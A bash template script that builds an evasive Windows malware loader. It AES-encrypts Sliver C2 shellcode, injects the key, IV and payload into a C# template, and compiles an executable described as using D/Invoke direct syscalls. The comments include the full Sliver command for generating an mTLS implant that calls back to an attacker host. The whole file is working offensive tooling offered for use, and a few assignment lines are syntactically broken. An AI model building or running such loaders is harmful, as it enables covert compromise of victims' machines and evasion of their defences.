#!/bin/bash

### 
### Search [!!!] and fill in all the parameters
###

## Version 0.2, using D/Invoke with direct syscalls
## Using a c2 shellcode directly without donut
## This is a template bash file

## parameter inputs, make sure fill in the following parameters correctly
## [!!!] lhost and lport are not in use for this script, make sure arch and c2type are correct
lhost="10.0.0.145"
lport="8888"
arch="x64"
c2type="sliver"

echo 'lhost: '$lhost
echo 'lport: '$lport
echo 'arch:  '$arch
echo 'c2type:'$c2type

mkdir tmp
mkdir output

### To Generate a c2 shellcode (raw bin) payload without obfuscation, the following use sliver as example:
# [server] sliver > generate -N sliver --mtls 10.0.0.145 -b 10.0.0.145 --skip-symbols -f shellcode --save /root/Codes/c2loader/input/
# [*] Generating new windows/amd64 implant binary
# [!] Symbol obfuscation is disabled
# [*] Build completed in 00:01:25
# [*] Implant saved to /root/Codes/c2loader/input/sliver.bin
#
### Move the sliver.bin to folder input if required, then run the autogen script.

# [!!!] this file name can be any but have to be same as your c2 shellcode payload file in the input folder:
rawscfilename='sliver.bin'

rawscfilename_enc=$rawscfilename'.enc'
final_cs_filename = 'monoc2loader_'$c2type'.cs'
final_exe_filename = 'monoc2loader_'$c2type'_'$arch'.exe'

sleep 2

# copy the cs template file
cp aesloader2_template.txt tmp/$final_cs_filename
# compile the AES encryptor
mono-csc -out:encryptor.exe -platform:x64 encryptor.cs
# encrypt the shellcode payload
mono encryptor.exe input/$rawscfilename tmp/$rawscfilename_enc | tee tmp/enc_output2.txt

encpayload=$(cat tmp/enc_output2.txt | grep 'Encrypted' | cut -d ' ' -f 2)
encpayloadlength=$(cat tmp/enc_output2.txt | grep 'PayloadLength' | cut -d ':' -f 2)
aeskey=$(cat tmp/enc_output2.txt | grep 'AES_Key' | cut -d ':' -f 2)
aesiv=$(cat tmp/enc_output2.txt | grep 'AES_IV' | cut -d ':' -f 2)

if [ $arch = 'x64' ]
then
    sed -i 's|{{TARGETARCH}}|true|g' tmp/$final_cs_filename
fi

if [ $arch = 'x86' ]
then
    sed -i 's|{{TARGETARCH}}|false|g' tmp/$final_cs_filename
fi
sleep 1
sed -i 's|{{AESKEY}}|'$aeskey'|g' tmp/$final_cs_filename
sleep 1
sed -i 's|{{AESIV}}|'$aesiv'|g' tmp/$final_cs_filename
sleep 1
sed -i 's|{{PAYLOADLENGTH}}|'$encpayloadlength'|g' tmp/$final_cs_filename
sleep 1
#sed -i 's|{{ENCSHELLCODEPAYLOAD}}|'$encpayload'|g' tmp/$final_cs_filename
sed -i '' -f /dev/stdin tmp/$final_cs_filename << EOF
s/{{ENCSHELLCODEPAYLOAD}}/$encpayload/g
EOF
sleep 1

# compile the final exe output
mono-csc -out:output/$final_exe_filename -platform:$arch -unsafe tmp/$final_cs_filename
